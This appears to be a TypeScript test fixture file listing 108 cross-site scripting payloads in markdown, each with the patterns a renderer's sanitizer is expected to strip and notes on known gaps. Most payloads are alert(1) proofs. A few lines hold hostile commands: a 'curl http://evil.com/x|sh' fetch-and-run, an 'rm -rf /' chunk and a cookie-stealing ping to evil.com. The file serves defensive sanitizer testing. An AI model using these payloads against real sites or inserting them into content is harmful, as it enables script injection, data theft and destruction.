export interface XssFixture {
  id: string
  label: string
  markdown: string
  blockedPatterns: string[]
  knownGap?: string
}

const blocked = (patterns: string[]) => patterns

export const XSS_FIXTURES: XssFixture[] = [
  // --- script tag variants ---
  {
    id: 'xss-01',
    label: 'inline <script> tag',
    markdown: '<script>alert(1)</script>',
    blockedPatterns: blocked(['<script', 'alert(1)']),
  },
  {
    id: 'xss-02',
    label: '<script> in fenced code block',
    markdown: '```\n<script>alert(1)</script>\n```',
    blockedPatterns: blocked(['<script']),
  },
  {
    id: 'xss-03',
    label: '<script> inside blockquote',
    markdown: '> <script>alert(1)</script>',
    blockedPatterns: blocked(['<script']),
  },
  {
    id: 'xss-04',
    label: '<script> with type attribute',
    markdown: '<script type="text/javascript">alert(1)</script>',
    blockedPatterns: blocked(['<script']),
  },
  {
    id: 'xss-05',
    label: 'multiple <script> tags',
    markdown: '<script>alert(1)</script><script>alert(2)</script>',
    blockedPatterns: blocked(['<script']),
  },

  // --- img/onerror ---
  {
    id: 'xss-06',
    label: '<img onerror> handler',
    markdown: '<img src=x onerror="alert(1)">',
    blockedPatterns: blocked(['onerror']),
  },
  {
    id: 'xss-07',
    label: '<img onerror> with encoded quotes',
    markdown: '<img src=x onerror=&#34;alert(1)&#34;>',
    blockedPatterns: blocked(['onerror']),
  },
  {
    id: 'xss-08',
    label: '<img onload> handler',
    markdown: '<img src=x onload="alert(1)">',
    blockedPatterns: blocked(['onload']),
  },
  {
    id: 'xss-09',
    label: '<img> with SVG onload',
    markdown: '<svg onload="alert(1)">',
    blockedPatterns: blocked(['onload']),
  },

  // --- javascript: URIs ---
  {
    id: 'xss-10',
    label: 'link with javascript: URI',
    markdown: '[click](javascript:alert(1))',
    blockedPatterns: blocked(['javascript:']),
  },
  {
    id: 'xss-11',
    label: 'javascript: URI with whitespace',
    markdown: '[click]( javascript:alert(1))',
    blockedPatterns: blocked(['javascript:']),
  },
  {
    id: 'xss-12',
    label: 'javascript: URI encoded as &#x6A;',
    markdown: '[click](&#x6A;avascript:alert(1))',
    blockedPatterns: blocked(['javascript:', '&#x6A;avascript']),
  },
  {
    id: 'xss-13',
    label: 'VBS URIs',
    markdown: '[click](vbscript:MsgBox(1))',
    blockedPatterns: blocked(['vbscript:']),
  },

  // --- iframe ---
  {
    id: 'xss-14',
    label: '<iframe> with data: URI',
    markdown: '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>',
    blockedPatterns: blocked(['<iframe', 'data:text/html']),
  },
  {
    id: 'xss-15',
    label: '<iframe> with javascript: URI',
    markdown: '<iframe src="javascript:alert(1)"></iframe>',
    blockedPatterns: blocked(['<iframe', 'javascript:']),
  },
  {
    id: 'xss-16',
    label: '<iframe> with http src',
    markdown: '<iframe src="http://evil.com/"></iframe>',
    blockedPatterns: blocked(['<iframe']),
  },
  {
    id: 'xss-17',
    label: '<embed> tag',
    markdown: '<embed src="data:text/html,<script>alert(1)</script>">',
    blockedPatterns: blocked(['<embed']),
  },
  {
    id: 'xss-18',
    label: '<object> tag',
    markdown: '<object data="data:text/html,<script>alert(1)</script>"></object>',
    blockedPatterns: blocked(['<object']),
  },

  // --- event handlers in various positions ---
  {
    id: 'xss-19',
    label: 'onclick on <div>',
    markdown: '<div onclick="alert(1)">click me</div>',
    blockedPatterns: blocked(['onclick']),
  },
  {
    id: 'xss-20',
    label: 'onmouseover on <span>',
    markdown: '<span onmouseover="alert(1)">hover</span>',
    blockedPatterns: blocked(['onmouseover']),
  },
  {
    id: 'xss-21',
    label: 'onfocus with autofocus',
    markdown: '<input onfocus="alert(1)" autofocus>',
    blockedPatterns: blocked(['onfocus', 'autofocus']),
  },
  {
    id: 'xss-22',
    label: 'onmouseover in link',
    markdown: '<a href="#" onmouseover="alert(1)">link</a>',
    blockedPatterns: blocked(['onmouseover']),
  },
  {
    id: 'xss-23',
    label: 'style with expression()',
    markdown: '<div style="width:expression(alert(1))">x</div>',
    blockedPatterns: blocked(['expression(']),
  },
  {
    id: 'xss-24',
    label: 'style with background-image url(javascript:)',
    markdown: '<div style="background-image:url(javascript:alert(1))">x</div>',
    blockedPatterns: blocked(['javascript:']),
  },

  // --- SVG with <script> ---
  {
    id: 'xss-25',
    label: 'SVG inline <script>',
    markdown: '<svg><script>alert(1)</script></svg>',
    blockedPatterns: blocked(['<script']),
  },
  {
    id: 'xss-26',
    label: 'SVG with onload',
    markdown: '<svg onload="alert(1)"/>',
    blockedPatterns: blocked(['onload']),
  },
  {
    id: 'xss-27',
    label: 'SVG <animate> with onload',
    markdown: '<svg><animate onbegin="alert(1)" attributeName="x" dur="1s"></svg>',
    blockedPatterns: blocked(['onbegin']),
  },
  {
    id: 'xss-28',
    label: 'SVG <set> with onbegin',
    markdown: '<svg><set onbegin="alert(1)" attributeName="x" to="1"></svg>',
    blockedPatterns: blocked(['onbegin']),
  },

  // --- data: URIs ---
  {
    id: 'xss-29',
    label: 'link with data: URI',
    markdown: '[click](data:text/html,<script>alert(1)</script>)',
    blockedPatterns: blocked(['data:text/html']),
  },
  {
    id: 'xss-30',
    label: 'link with data: base64',
    markdown: '[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)',
    blockedPatterns: blocked(['data:text/html']),
  },

  // --- Math/KaTeX with embedded scripts ---
  {
    id: 'xss-31',
    label: 'KaTeX with embedded <script>',
    markdown: '$$\\html{<script>alert(1)</script>}$$',
    blockedPatterns: blocked(['<script']),
  },
  {
    id: 'xss-32',
    label: 'inline math with HTML injection',
    markdown: '$<img src=x onerror=alert(1)>$',
    blockedPatterns: blocked(['onerror']),
  },
  {
    id: 'xss-33',
    label: 'math fence with script',
    markdown: '```math\n\\html{<script>alert(1)</script>}\n```',
    blockedPatterns: blocked(['<script']),
  },

  // --- Wikilink embeds with protocol handlers ---
  {
    id: 'xss-34',
    label: 'wikilink embed with javascript:',
    markdown: '![[javascript:alert(1)]]',
    blockedPatterns: [],
    knownGap: 'Wikilink embed processor passes protocol handlers as raw text',
  },
  {
    id: 'xss-35',
    label: 'wikilink with data:',
    markdown: '![[data:text/html,<script>alert(1)</script>]]',
    blockedPatterns: [],
    knownGap: 'Wikilink embed processor passes data: URIs as raw text',
  },

  // --- Code chunks with dangerous commands ---
  {
    id: 'xss-36',
    label: 'code chunk with rm -rf',
    markdown: '```{python cmd="rm -rf /"}\nprint("hi")\n```',
    blockedPatterns: blocked(['rm -rf']),
  },
  {
    id: 'xss-37',
    label: 'code chunk with curl pipe sh',
    markdown: '```{bash cmd="curl http://evil.com/x|sh"}\necho hi\n```',
    blockedPatterns: blocked(['curl']),
  },

  // --- HTML injection in markdown structures ---
  {
    id: 'xss-38',
    label: '<details> with ontoggle',
    markdown: '<details ontoggle="alert(1)"><summary>x</summary></details>',
    blockedPatterns: blocked(['ontoggle']),
  },
  {
    id: 'xss-39',
    label: '<body> with onload',
    markdown: '<body onload="alert(1)">',
    blockedPatterns: blocked(['onload']),
  },
  {
    id: 'xss-40',
    label: '<video> with onerror',
    markdown: '<video src=x onerror="alert(1)">',
    blockedPatterns: blocked(['onerror']),
  },
  {
    id: 'xss-41',
    label: '<audio> with onerror',
    markdown: '<audio src=x onerror="alert(1)">',
    blockedPatterns: blocked(['onerror']),
  },
  {
    id: 'xss-42',
    label: '<input> with oninput',
    markdown: '<input oninput="alert(1)">',
    blockedPatterns: blocked(['oninput']),
  },
  {
    id: 'xss-43',
    label: '<textarea> with onfocus',
    markdown: '<textarea onfocus="alert(1)">x</textarea>',
    blockedPatterns: blocked(['onfocus']),
  },
  {
    id: 'xss-44',
    label: '<select> with onchange',
    markdown: '<select onchange="alert(1)"><option>x</option></select>',
    blockedPatterns: blocked(['onchange']),
  },
  {
    id: 'xss-45',
    label: '<form> with action javascript:',
    markdown: '<form action="javascript:alert(1)"><input type=submit></form>',
    blockedPatterns: blocked(['javascript:']),
  },

  // --- Encoded variants ---
  {
    id: 'xss-46',
    label: 'javascript: with tab encoding',
    markdown: '[click](java\tscript:alert(1))',
    blockedPatterns: blocked(['javascript:']),
  },
  {
    id: 'xss-47',
    label: 'base tag injection',
    markdown: '<base href="javascript:alert(1)//">',
    blockedPatterns: blocked(['<base', 'javascript:']),
  },
  {
    id: 'xss-48',
    label: 'meta refresh injection',
    markdown: '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
    blockedPatterns: blocked(['<meta', 'javascript:']),
  },
  {
    id: 'xss-49',
    label: 'link with stylesheet import',
    markdown: '<link rel="stylesheet" href="javascript:alert(1)">',
    blockedPatterns: blocked(['<link', 'javascript:']),
  },
  {
    id: 'xss-50',
    label: 'comment-based IE conditional',
    markdown: '<!--[if gte IE 4]><script>alert(1)</script><![endif]-->',
    blockedPatterns: blocked(['<script']),
  },

  // --- Mutation XSS (mXSS) via attribute parsing ---
  {
    id: 'xss-51',
    label: 'mutation XSS via backtick attribute',
    markdown: '<img src=x onerror=`alert(1)`>',
    blockedPatterns: blocked(['onerror']),
  },
  {
    id: 'xss-52',
    label: 'mutation XSS via unquoted attribute with spaces',
    markdown: '<img src=x onerror=alert(1)>',
    blockedPatterns: blocked(['onerror']),
  },
  {
    id: 'xss-53',
    label: 'mutation XSS via broken tag nesting',
    markdown: '<div><img src="x" onerror="alert(1)"</div>',
    blockedPatterns: blocked(['onerror']),
  },

  // --- DOM clobbering ---
  {
    id: 'xss-54',
    label: 'DOM clobbering via form element',
    markdown: '<form id="document"><input name="cookie">',
    blockedPatterns: blocked(['<form']),
  },
  {
    id: 'xss-55',
    label: 'DOM clobbering via anchor name',
    markdown: '<a id="document" name="cookie" href="http://evil.com">',
    blockedPatterns: blocked(['<a']),
  },

  // --- CSS injection ---
  {
    id: 'xss-56',
    label: 'CSS injection via position:fixed overlay',
    markdown: '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">overlay</div>',
    blockedPatterns: blocked(['position:fixed']),
    knownGap: 'CSS property filtering may not catch all layout-jacking vectors',
  },
  {
    id: 'xss-57',
    label: 'CSS expression() in background',
    markdown: '<div style="background:expression(alert(1))">x</div>',
    blockedPatterns: blocked(['expression(']),
  },
  {
    id: 'xss-58',
    label: 'CSS -moz-binding injection',
    markdown: '<div style="-moz-binding:url(http://evil.com/xss.xml#xss)">x</div>',
    blockedPatterns: blocked(['-moz-binding']),
    knownGap: 'CSS binding may not be filtered by all sanitizers',
  },

  // --- Additional event handlers ---
  {
    id: 'xss-59',
    label: 'onerror in <source> element',
    markdown: '<video><source onerror="alert(1)"></video>',
    blockedPatterns: blocked(['onerror']),
  },
  {
    id: 'xss-60',
    label: 'onerror in <track> element',
    markdown: '<video><track onerror="alert(1)"></video>',
    blockedPatterns: blocked(['onerror']),
  },
  {
    id: 'xss-61',
    label: 'onanimationend handler',
    markdown: '<div onanimationend="alert(1)">x</div>',
    blockedPatterns: blocked(['onanimationend']),
  },
  {
    id: 'xss-62',
    label: 'ontouchstart handler (mobile)',
    markdown: '<div ontouchstart="alert(1)">x</div>',
    blockedPatterns: blocked(['ontouchstart']),
  },

  // --- data: URI variants ---
  {
    id: 'xss-63',
    label: 'data: URI with SVG script',
    markdown: '[click](data:image/svg+xml,<svg onload=alert(1)>)',
    blockedPatterns: blocked(['data:image/svg+xml']),
  },
  {
    id: 'xss-64',
    label: 'data: URI with application/x-javascript',
    markdown: '[click](data:application/x-javascript,alert(1))',
    blockedPatterns: blocked(['data:application/x-javascript']),
  },

  // --- SVG animateTransform ---
  {
    id: 'xss-65',
    label: 'SVG animateTransform with onbegin',
    markdown: '<svg><animateTransform onbegin="alert(1)" attributeName="transform" type="rotate" from="0" to="360" dur="1s"/></svg>',
    blockedPatterns: blocked(['onbegin']),
  },
  {
    id: 'xss-66',
    label: 'SVG <use> with external reference',
    markdown: '<svg><use href="data:image/svg+xml,<svg id=x onload=alert(1)>"/></svg>',
    blockedPatterns: blocked(['onload']),
  },

  // --- Template injection ---
  {
    id: 'xss-67',
    label: 'Angular template injection',
    markdown: '{{constructor.constructor("alert(1)")()}}',
    blockedPatterns: blocked(['{{']),
    knownGap: 'Angular template syntax may pass through HTML sanitizers',
  },
  {
    id: 'xss-68',
    label: 'Svelte template injection',
    markdown: '{@html `<script>alert(1)</script>`}',
    blockedPatterns: blocked(['<script']),
  },

  // --- srcdoc attribute ---
  {
    id: 'xss-69',
    label: 'iframe srcdoc with script',
    markdown: '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
    blockedPatterns: blocked(['<iframe', '<script']),
  },
  {
    id: 'xss-70',
    label: 'iframe srcdoc with event handler',
    markdown: '<iframe srcdoc="<img src=x onerror=alert(1)>"></iframe>',
    blockedPatterns: blocked(['<iframe', 'onerror']),
  },

  // --- formaction ---
  {
    id: 'xss-71',
    label: 'button formaction with javascript:',
    markdown: '<form><button formaction="javascript:alert(1)">click</button></form>',
    blockedPatterns: blocked(['javascript:', '<form']),
  },

  // --- href with newline bypass ---
  {
    id: 'xss-72',
    label: 'link href with newline before javascript:',
    markdown: '[click](\njavascript:alert(1))',
    blockedPatterns: blocked(['javascript:']),
  },
  {
    id: 'xss-73',
    label: 'link href with tab before javascript:',
    markdown: '[click](\tjavascript:alert(1))',
    blockedPatterns: blocked(['javascript:']),
  },

  // --- SVG foreignObject ---
  {
    id: 'xss-74',
    label: 'SVG foreignObject with embedded HTML',
    markdown: '<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject></svg>',
    blockedPatterns: blocked(['<script']),
  },

  // --- MathML with annotation ---
  {
    id: 'xss-75',
    label: 'MathML annotation-xml with HTML',
    markdown: '<math><annotation-xml encoding="text/html"><script>alert(1)</script></annotation-xml></math>',
    blockedPatterns: blocked(['<script']),
  },

  // --- Cookie exfiltration via link ---
  {
    id: 'xss-76',
    label: 'link with ping to exfil endpoint',
    markdown: '<a href="http://evil.com" ping="http://evil.com/steal?cookie=1">click</a>',
    blockedPatterns: blocked(['ping']),
    knownGap: 'ping attribute filtering depends on sanitizer config',
  },

  // --- Refresh header ---
  {
    id: 'xss-77',
    label: 'meta refresh with data: URI',
    markdown: '<meta http-equiv="refresh" content="0;data:text/html,<script>alert(1)</script>">',
    blockedPatterns: blocked(['<meta', 'data:text/html']),
  },

  // --- srcset injection ---
  {
    id: 'xss-78',
    label: 'img srcset with javascript: URI',
    markdown: '<img srcset="javascript:alert(1)">',
    blockedPatterns: blocked(['javascript:']),
  },

  // --- poster attribute ---
  {
    id: 'xss-79',
    label: 'video poster with javascript: URI',
    markdown: '<video poster="javascript:alert(1)">',
    blockedPatterns: blocked(['javascript:']),
  },

  // --- Lowsrc (legacy IE) ---
  {
    id: 'xss-80',
    label: 'img lowsrc with javascript:',
    markdown: '<img lowsrc="javascript:alert(1)">',
    blockedPatterns: blocked(['javascript:']),
    knownGap: 'lowsrc is a legacy attribute not always filtered',
  },

  // --- math maction ---
  {
    id: 'xss-81',
    label: 'MathML maction with actiontype toggle',
    markdown: '<math><maction actiontype="statusline"><mtext><script>alert(1)</script></mtext></maction></math>',
    blockedPatterns: blocked(['<script']),
  },

  // --- noscript ---
  {
    id: 'xss-82',
    label: '<noscript> with embedded img onerror',
    markdown: '<noscript><img src=x onerror="alert(1)"></noscript>',
    blockedPatterns: blocked(['onerror']),
  },

  // --- xmp / listing (legacy raw HTML) ---
  {
    id: 'xss-83',
    label: '<xmp> with script',
    markdown: '<xmp><script>alert(1)</script></xmp>',
    blockedPatterns: blocked(['<script']),
  },
  {
    id: 'xss-84',
    label: '<listing> with script',
    markdown: '<listing><script>alert(1)</script></listing>',
    blockedPatterns: blocked(['<script']),
  },

  // --- marquee with onstart ---
  {
    id: 'xss-85',
    label: '<marquee> with onstart',
    markdown: '<marquee onstart="alert(1)">scroll</marquee>',
    blockedPatterns: blocked(['onstart']),
  },

  // --- dialog with onclose ---
  {
    id: 'xss-86',
    label: '<dialog> with onclose',
    markdown: '<dialog onclose="alert(1)">x</dialog>',
    blockedPatterns: blocked(['onclose']),
  },

  // --- slot injection ---
  {
    id: 'xss-87',
    label: '<slot> with onslotchange',
    markdown: '<slot onslotchange="alert(1)">x</slot>',
    blockedPatterns: blocked(['onslotchange']),
  },

  // --- Custom element with on* handler ---
  {
    id: 'xss-88',
    label: 'custom element with onclick',
    markdown: '<custom-element onclick="alert(1)">x</custom-element>',
    blockedPatterns: blocked(['onclick']),
  },

  // --- data: URI with text/html base64 payload ---
  {
    id: 'xss-89',
    label: 'iframe data: URI with base64-encoded script',
    markdown: '<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>',
    blockedPatterns: blocked(['<iframe', 'data:text/html']),
  },

  // --- javascript: with null byte injection ---
  {
    id: 'xss-90',
    label: 'javascript: with null byte in URL',
    markdown: '[click](java\x00script:alert(1))',
    blockedPatterns: blocked(['javascript:']),
  },

  // --- <image> alias for <img> (SVG) ---
  {
    id: 'xss-91',
    label: '<image> alias with onerror',
    markdown: '<image src=x onerror="alert(1)">',
    blockedPatterns: blocked(['onerror']),
  },

  // --- <a> ping attribute ---
  {
    id: 'xss-92',
    label: 'anchor with ping to data: URI',
    markdown: '<a href="#" ping="data:text/html,<script>alert(1)</script>">click</a>',
    blockedPatterns: blocked(['data:text/html', 'ping']),
  },

  // --- CSS url() with javascript ---
  {
    id: 'xss-93',
    label: 'CSS url() with javascript protocol in style',
    markdown: '<div style="list-style-image:url(javascript:alert(1))">x</div>',
    blockedPatterns: blocked(['javascript:']),
  },

  // --- SVG set with href to javascript ---
  {
    id: 'xss-94',
    label: 'SVG set with xlink:href javascript',
    markdown: '<svg><set attributeName="href" to="javascript:alert(1)"/></svg>',
    blockedPatterns: blocked(['javascript:']),
  },

  // --- CSS animation keyframes injection ---
  {
    id: 'xss-95',
    label: 'CSS @keyframes with animation trigger',
    markdown: '<style>@keyframes xss{from{background:url(javascript:alert(1))}to{background:none}}</style><div style="animation:xss 1s">x</div>',
    blockedPatterns: blocked(['<style', 'javascript:']),
  },

  // --- SVG <a> with xlink:href javascript ---
  {
    id: 'xss-96',
    label: 'SVG anchor with xlink:href javascript',
    markdown: '<svg><a xlink:href="javascript:alert(1)"><text>click</text></a></svg>',
    blockedPatterns: blocked(['javascript:']),
  },

  // --- formmethod attribute override ---
  {
    id: 'xss-97',
    label: 'button formmethod POST with javascript action',
    markdown: '<form action="/safe"><button formmethod="get" formaction="javascript:alert(1)">click</button></form>',
    blockedPatterns: blocked(['javascript:']),
  },

  // --- Obfuscated javascript: via HTML entity ---
  {
    id: 'xss-98',
    label: 'javascript: URI with HTML entity obfuscation',
    markdown: '[click](java&#x73;cript:alert(1))',
    blockedPatterns: blocked(['javascript:', 'java&#x73;cript']),
  },

  // --- data: URI with text/xml payload ---
  {
    id: 'xss-99',
    label: 'data: URI with text/xml and embedded script',
    markdown: '[click](data:text/xml,<script>alert(1)</script>)',
    blockedPatterns: blocked(['data:text/xml', '<script']),
  },

  // --- <details open> with ontoggle (no user interaction) ---
  {
    id: 'xss-100',
    label: '<details open> with ontoggle auto-fire',
    markdown: '<details open ontoggle="alert(1)"><summary>x</summary></details>',
    blockedPatterns: blocked(['ontoggle']),
  },

  // --- SVG <foreignObject> with data: URI ---
  {
    id: 'xss-101',
    label: 'SVG foreignObject with data: URI src',
    markdown: '<svg><foreignObject><iframe src="data:text/html,<script>alert(1)</script>"></iframe></foreignObject></svg>',
    blockedPatterns: blocked(['<iframe', 'data:text/html']),
  },

  // --- srcdoc with base64 encoded payload ---
  {
    id: 'xss-102',
    label: 'iframe srcdoc with base64-encoded script',
    markdown: '<iframe srcdoc="PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>',
    blockedPatterns: blocked(['<iframe']),
  },

  // --- CSS import with javascript ---
  {
    id: 'xss-103',
    label: 'CSS @import with javascript URI',
    markdown: '<style>@import url("javascript:alert(1)");</style>',
    blockedPatterns: blocked(['<style', 'javascript:']),
  },

  // --- ontransitionend handler ---
  {
    id: 'xss-104',
    label: 'ontransitionend handler on div',
    markdown: '<div ontransitionend="alert(1)">x</div>',
    blockedPatterns: blocked(['ontransitionend']),
  },

  // --- SVG <image> with external href ---
  {
    id: 'xss-105',
    label: 'SVG image with javascript href',
    markdown: '<svg><image href="javascript:alert(1)"/></svg>',
    blockedPatterns: blocked(['javascript:']),
  },

  // --- a ping with multiple endpoints ---
  {
    id: 'xss-106',
    label: 'anchor ping with multiple tracking endpoints',
    markdown: '<a href="#" ping="http://evil.com/1 http://evil.com/2">click</a>',
    blockedPatterns: blocked(['ping']),
  },

  // --- object type with data: URI ---
  {
    id: 'xss-107',
    label: 'object type text/html with data: URI',
    markdown: '<object type="text/html" data="data:text/html,<script>alert(1)</script>"></object>',
    blockedPatterns: blocked(['<object', 'data:text/html']),
  },

  // --- SVG animate with values containing javascript ---
  {
    id: 'xss-108',
    label: 'SVG animate with javascript in values',
    markdown: '<svg><animate attributeName="href" values="javascript:alert(1)"/></svg>',
    blockedPatterns: blocked(['javascript:']),
  },
]
